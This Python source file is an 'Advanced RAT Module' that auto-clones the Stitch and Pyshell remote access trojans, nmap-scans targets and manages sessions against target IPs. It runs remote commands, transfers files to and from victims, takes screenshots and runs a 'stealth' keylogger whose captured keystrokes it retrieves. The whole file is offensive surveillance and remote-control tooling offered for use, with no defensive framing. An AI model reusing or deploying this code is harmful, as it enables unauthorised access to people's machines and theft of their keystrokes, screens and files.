"""
Advanced RAT Module
Advanced Remote Access Trojan with Stitch and Pyshell integration
"""

import asyncio
import json
import logging
import os
import subprocess
import time
import socket
import threading
import base64
import hashlib
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import psutil
import requests
import paramiko
import nmap

@dataclass
class RATSession:
    """RAT session information"""
    session_id: str
    target_ip: str
    target_port: int
    tool_used: str
    status: str
    start_time: float
    last_activity: float
    capabilities: Dict
    active_commands: List[str]
    transferred_files: List[str]

class AdvancedRATModule:
    """Advanced RAT module with Stitch and Pyshell integration"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.active_sessions: Dict[str, RATSession] = {}
        self.session_history: List[Dict] = []
        self.rat_tools = {
            "stitch": {
                "path": "external_tools/stitch",
                "executable": "python main.py",
                "capabilities": ["file_transfer", "screenshot", "keylogger", "process_control", "registry_access"]
            },
            "pyshell": {
                "path": "external_tools/pyshell", 
                "executable": "python pyshell.py",
                "capabilities": ["file_transfer", "screenshot", "keylogger", "process_control", "network_scan"]
            }
        }
        
        # Initialize tools
        self._initialize_rat_tools()
    
    def _initialize_rat_tools(self):
        """Initialize RAT tools"""
        for tool_name, tool_config in self.rat_tools.items():
            tool_path = tool_config["path"]
            if not os.path.exists(tool_path):
                self.logger.warning(f"RAT tool {tool_name} not found at {tool_path}")
                # Create directory and clone tool
                os.makedirs(tool_path, exist_ok=True)
                self._clone_rat_tool(tool_name, tool_path)
    
    def _clone_rat_tool(self, tool_name: str, tool_path: str):
        """Clone RAT tool from repository"""
        try:
            if tool_name == "stitch":
                repo_url = "https://github.com/nathanlopez/Stitch.git"
            elif tool_name == "pyshell":
                repo_url = "https://github.com/knassar702/pyshell.git"
            else:
                return
            
            # Clone repository
            subprocess.run([
                "git", "clone", repo_url, tool_path
            ], check=True)
            
            # Install dependencies
            if tool_name == "stitch":
                requirements_file = os.path.join(tool_path, "lnx_requirements.txt")
                if os.path.exists(requirements_file):
                    subprocess.run([
                        "pip", "install", "-r", requirements_file
                    ], cwd=tool_path, check=True)
            
            self.logger.info(f"Successfully cloned and initialized {tool_name}")
            
        except Exception as e:
            self.logger.error(f"Failed to clone {tool_name}: {str(e)}")
    
    async def create_rat_session(self, target_ip: str, target_port: int = 5555, tool: str = "auto") -> Dict:
        """Create new RAT session"""
        try:
            # Auto-select best tool based on target
            if tool == "auto":
                tool = self._select_best_rat_tool(target_ip)
            
            session_id = f"rat_{int(time.time())}_{hashlib.md5(f'{target_ip}:{target_port}'.encode()).hexdigest()[:8]}"
            
            # Test connection
            connection_test = await self._test_connection(target_ip, target_port)
            if not connection_test["success"]:
                return {
                    "success": False,
                    "error": f"Connection failed: {connection_test['error']}"
                }
            
            # Create session
            session = RATSession(
                session_id=session_id,
                target_ip=target_ip,
                target_port=target_port,
                tool_used=tool,
                status="connecting",
                start_time=time.time(),
                last_activity=time.time(),
                capabilities=self.rat_tools[tool]["capabilities"],
                active_commands=[],
                transferred_files=[]
            )
            
            # Establish connection
            connection_result = await self._establish_connection(session)
            if connection_result["success"]:
                session.status = "connected"
                session.last_activity = time.time()
                self.active_sessions[session_id] = session
                
                # Log session
                self.session_history.append(asdict(session))
                
                return {
                    "success": True,
                    "session_id": session_id,
                    "tool_used": tool,
                    "capabilities": session.capabilities,
                    "message": f"RAT session established with {target_ip}:{target_port}"
                }
            else:
                return {
                    "success": False,
                    "error": connection_result["error"]
                }
                
        except Exception as e:
            self.logger.error(f"Error creating RAT session: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _select_best_rat_tool(self, target_ip: str) -> str:
        """Select best RAT tool for target"""
        try:
            # Scan target to determine best tool
            nm = nmap.PortScanner()
            scan_result = nm.scan(target_ip, arguments='-sS -T4 -F')
            
            if target_ip in scan_result['scan']:
                open_ports = scan_result['scan'][target_ip]['tcp'].keys()
                
                # If SSH is open, prefer Stitch
                if 22 in open_ports:
                    return "stitch"
                # If common RAT ports are open, prefer Pyshell
                elif any(port in open_ports for port in [4444, 5555, 8080]):
                    return "pyshell"
                else:
                    return "stitch"  # Default to Stitch
            else:
                return "stitch"  # Default
                
        except Exception:
            return "stitch"  # Default on error
    
    async def _test_connection(self, target_ip: str, target_port: int) -> Dict:
        """Test connection to target"""
        try:
            # Test TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            result = sock.connect_ex((target_ip, target_port))
            sock.close()
            
            if result == 0:
                return {"success": True}
            else:
                return {
                    "success": False,
                    "error": f"Port {target_port} is not accessible"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _establish_connection(self, session: RATSession) -> Dict:
        """Establish RAT connection"""
        try:
            tool_config = self.rat_tools[session.tool_used]
            tool_path = tool_config["path"]
            executable = tool_config["executable"]
            
            # Start RAT tool process
            if session.tool_used == "stitch":
                return await self._start_stitch_connection(session)
            elif session.tool_used == "pyshell":
                return await self._start_pyshell_connection(session)
            else:
                return {
                    "success": False,
                    "error": f"Unknown RAT tool: {session.tool_used}"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_stitch_connection(self, session: RATSession) -> Dict:
        """Start Stitch connection"""
        try:
            tool_path = self.rat_tools["stitch"]["path"]
            
            # Create Stitch configuration
            config = {
                "target": f"{session.target_ip}:{session.target_port}",
                "mode": "connect",
                "encryption": True,
                "stealth": True
            }
            
            # Start Stitch process
            process = await asyncio.create_subprocess_exec(
                "python", "main.py",
                "--target", f"{session.target_ip}:{session.target_port}",
                "--connect",
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for connection
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    return {"success": True}
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Connection timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_pyshell_connection(self, session: RATSession) -> Dict:
        """Start Pyshell connection"""
        try:
            tool_path = self.rat_tools["pyshell"]["path"]
            
            # Start Pyshell process
            process = await asyncio.create_subprocess_exec(
                "python", "pyshell.py",
                "--target", f"{session.target_ip}:{session.target_port}",
                "--connect",
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for connection
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    return {"success": True}
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Connection timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def execute_command(self, session_id: str, command: str, parameters: Dict = None) -> Dict:
        """Execute command on RAT session"""
        try:
            if session_id not in self.active_sessions:
                return {
                    "success": False,
                    "error": "Session not found"
                }
            
            session = self.active_sessions[session_id]
            session.last_activity = time.time()
            
            # Execute command based on tool
            if session.tool_used == "stitch":
                result = await self._execute_stitch_command(session, command, parameters)
            elif session.tool_used == "pyshell":
                result = await self._execute_pyshell_command(session, command, parameters)
            else:
                result = {
                    "success": False,
                    "error": f"Unknown tool: {session.tool_used}"
                }
            
            # Log command
            session.active_commands.append({
                "command": command,
                "parameters": parameters,
                "timestamp": time.time(),
                "result": result
            })
            
            return result
            
        except Exception as e:
            self.logger.error(f"Error executing command: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_stitch_command(self, session: RATSession, command: str, parameters: Dict) -> Dict:
        """Execute command using Stitch"""
        try:
            tool_path = self.rat_tools["stitch"]["path"]
            
            # Build command
            cmd_args = ["python", "main.py", "--execute", command]
            
            if parameters:
                for key, value in parameters.items():
                    cmd_args.extend([f"--{key}", str(value)])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                return {
                    "success": True,
                    "output": stdout.decode(),
                    "command": command
                }
            else:
                return {
                    "success": False,
                    "error": stderr.decode(),
                    "command": command
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_pyshell_command(self, session: RATSession, command: str, parameters: Dict) -> Dict:
        """Execute command using Pyshell"""
        try:
            tool_path = self.rat_tools["pyshell"]["path"]
            
            # Build command
            cmd_args = ["python", "pyshell.py", "--command", command]
            
            if parameters:
                for key, value in parameters.items():
                    cmd_args.extend([f"--{key}", str(value)])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                return {
                    "success": True,
                    "output": stdout.decode(),
                    "command": command
                }
            else:
                return {
                    "success": False,
                    "error": stderr.decode(),
                    "command": command
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def transfer_file(self, session_id: str, local_path: str, remote_path: str, direction: str = "upload") -> Dict:
        """Transfer file to/from target"""
        try:
            if session_id not in self.active_sessions:
                return {
                    "success": False,
                    "error": "Session not found"
                }
            
            session = self.active_sessions[session_id]
            session.last_activity = time.time()
            
            # Transfer file based on tool
            if session.tool_used == "stitch":
                result = await self._transfer_file_stitch(session, local_path, remote_path, direction)
            elif session.tool_used == "pyshell":
                result = await self._transfer_file_pyshell(session, local_path, remote_path, direction)
            else:
                result = {
                    "success": False,
                    "error": f"Unknown tool: {session.tool_used}"
                }
            
            if result["success"]:
                session.transferred_files.append({
                    "local_path": local_path,
                    "remote_path": remote_path,
                    "direction": direction,
                    "timestamp": time.time()
                })
            
            return result
            
        except Exception as e:
            self.logger.error(f"Error transferring file: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _transfer_file_stitch(self, session: RATSession, local_path: str, remote_path: str, direction: str) -> Dict:
        """Transfer file using Stitch"""
        try:
            tool_path = self.rat_tools["stitch"]["path"]
            
            if direction == "upload":
                cmd_args = ["python", "main.py", "--upload", local_path, "--remote", remote_path]
            else:
                cmd_args = ["python", "main.py", "--download", remote_path, "--local", local_path]
            
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                return {
                    "success": True,
                    "message": f"File {direction} completed",
                    "local_path": local_path,
                    "remote_path": remote_path
                }
            else:
                return {
                    "success": False,
                    "error": stderr.decode()
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _transfer_file_pyshell(self, session: RATSession, local_path: str, remote_path: str, direction: str) -> Dict:
        """Transfer file using Pyshell"""
        try:
            tool_path = self.rat_tools["pyshell"]["path"]
            
            if direction == "upload":
                cmd_args = ["python", "pyshell.py", "--upload", local_path, "--remote", remote_path]
            else:
                cmd_args = ["python", "pyshell.py", "--download", remote_path, "--local", local_path]
            
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                return {
                    "success": True,
                    "message": f"File {direction} completed",
                    "local_path": local_path,
                    "remote_path": remote_path
                }
            else:
                return {
                    "success": False,
                    "error": stderr.decode()
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def take_screenshot(self, session_id: str) -> Dict:
        """Take screenshot of target"""
        try:
            if session_id not in self.active_sessions:
                return {
                    "success": False,
                    "error": "Session not found"
                }
            
            session = self.active_sessions[session_id]
            
            # Execute screenshot command
            result = await self.execute_command(session_id, "screenshot", {
                "format": "png",
                "quality": "high"
            })
            
            return result
            
        except Exception as e:
            self.logger.error(f"Error taking screenshot: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def start_keylogger(self, session_id: str, duration: int = 300) -> Dict:
        """Start keylogger on target"""
        try:
            if session_id not in self.active_sessions:
                return {
                    "success": False,
                    "error": "Session not found"
                }
            
            session = self.active_sessions[session_id]
            
            # Execute keylogger command
            result = await self.execute_command(session_id, "keylogger", {
                "action": "start",
                "duration": duration,
                "stealth": True
            })
            
            return result
            
        except Exception as e:
            self.logger.error(f"Error starting keylogger: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def stop_keylogger(self, session_id: str) -> Dict:
        """Stop keylogger on target"""
        try:
            if session_id not in self.active_sessions:
                return {
                    "success": False,
                    "error": "Session not found"
                }
            
            # Execute stop keylogger command
            result = await self.execute_command(session_id, "keylogger", {
                "action": "stop"
            })
            
            return result
            
        except Exception as e:
            self.logger.error(f"Error stopping keylogger: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def get_keylogger_data(self, session_id: str) -> Dict:
        """Get keylogger data from target"""
        try:
            if session_id not in self.active_sessions:
                return {
                    "success": False,
                    "error": "Session not found"
                }
            
            # Execute get keylogger data command
            result = await self.execute_command(session_id, "keylogger", {
                "action": "get_data"
            })
            
            return result
            
        except Exception as e:
            self.logger.error(f"Error getting keylogger data: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def get_session_info(self, session_id: str) -> Dict:
        """Get session information"""
        if session_id not in self.active_sessions:
            return {
                "success": False,
                "error": "Session not found"
            }
        
        session = self.active_sessions[session_id]
        return {
            "success": True,
            "session": asdict(session)
        }
    
    def get_all_sessions(self) -> Dict:
        """Get all active sessions"""
        sessions = []
        for session_id, session in self.active_sessions.items():
            sessions.append(asdict(session))
        
        return {
            "success": True,
            "sessions": sessions,
            "total": len(sessions)
        }
    
    async def close_session(self, session_id: str) -> Dict:
        """Close RAT session"""
        try:
            if session_id not in self.active_sessions:
                return {
                    "success": False,
                    "error": "Session not found"
                }
            
            session = self.active_sessions[session_id]
            
            # Execute disconnect command
            await self.execute_command(session_id, "disconnect")
            
            # Remove session
            del self.active_sessions[session_id]
            
            return {
                "success": True,
                "message": f"Session {session_id} closed successfully"
            }
            
        except Exception as e:
            self.logger.error(f"Error closing session: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def get_statistics(self) -> Dict:
        """Get RAT module statistics"""
        total_sessions = len(self.active_sessions)
        total_history = len(self.session_history)
        
        # Calculate success rate
        successful_sessions = len([s for s in self.session_history if s.get("status") == "connected"])
        success_rate = (successful_sessions / total_history * 100) if total_history > 0 else 0
        
        return {
            "active_sessions": total_sessions,
            "total_history": total_history,
            "success_rate": success_rate,
            "tools_available": list(self.rat_tools.keys()),
            "capabilities": list(set([cap for tool in self.rat_tools.values() for cap in tool["capabilities"]]))
        }